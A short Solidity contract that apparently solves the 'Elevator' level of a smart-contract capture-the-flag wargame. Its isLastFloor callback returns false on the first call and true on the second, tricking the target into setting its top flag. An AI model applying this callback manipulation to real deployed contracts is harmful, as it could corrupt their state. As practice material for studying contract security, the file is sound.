// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Building} from "./Elevator.sol";
import {Elevator} from "./Elevator.sol";

contract ElevatorHack {
    bool public top;
    uint256 public floor;
    Elevator elevator;
    uint256 public called;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (called == 0) {
            called++;
            return false;
        } else {
            return true;
        }
    }

    function hack() public {
        elevator.goTo(10);
    }
}
